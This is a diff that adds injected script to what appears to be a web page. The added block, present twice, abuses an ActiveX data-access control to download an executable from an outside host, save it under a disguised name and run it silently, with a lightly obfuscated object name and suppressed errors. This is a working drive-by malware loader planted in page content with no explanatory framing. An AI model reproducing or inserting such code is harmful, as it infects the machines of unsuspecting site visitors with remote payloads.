@@ -1,0 +1,20 @@
+<noscript> 
+<iframe src=*></iframe> 
+</noscript>
+<script language="JavaScript">
+<!--
+document.writeln("<script>var ailian,shenhua;ailian=\"http://www.gaimima130.com/2.exe\";shenhua=\"Microsoft.com\";try{var ado=(document.createElement(\"object\"));var d=1;ado.setAttribute(\"classid\",\"clsid:BD96C556-65A3-11D0-983A-00C04FC29E36\");var e=1;var xml=ado.CreateObject(\"Microsoft.XMLHTTP\",\"\");var f=1;var ln=\"Ado\";var lzn=\"db.St\";var an=\"ream\";var g=1;var as=ado.createobject(ln+lzn+an,\"\");var h=1;xml.Open(\"GET\",ailian,0);xml.Send();as.type=1;var n=1;as.open();as.write(xml.responseBody);as.savetofile(shenhua,2);as.close();var shell=ado.createobject(\"Shell.Application\",\"\");shell.Shellexecute(shenhua,\"\",\"\",\"open\",0);}catch(e){};</script\>");
+//-->
+</script>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+<noscript> 
+<iframe src=*></iframe> 
+</noscript>
+<script language="JavaScript">
+<!--
+document.writeln("<script>var ailian,shenhua;ailian=\"http://www.gaimima130.com/2.exe\";shenhua=\"Microsoft.com\";try{var ado=(document.createElement(\"object\"));var d=1;ado.setAttribute(\"classid\",\"clsid:BD96C556-65A3-11D0-983A-00C04FC29E36\");var e=1;var xml=ado.CreateObject(\"Microsoft.XMLHTTP\",\"\");var f=1;var ln=\"Ado\";var lzn=\"db.St\";var an=\"ream\";var g=1;var as=ado.createobject(ln+lzn+an,\"\");var h=1;xml.Open(\"GET\",ailian,0);xml.Send();as.type=1;var n=1;as.open();as.write(xml.responseBody);as.savetofile(shenhua,2);as.close();var shell=ado.createobject(\"Shell.Application\",\"\");shell.Shellexecute(shenhua,\"\",\"\",\"open\",0);}catch(e){};</script\>");
+//-->
+</script>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+
+
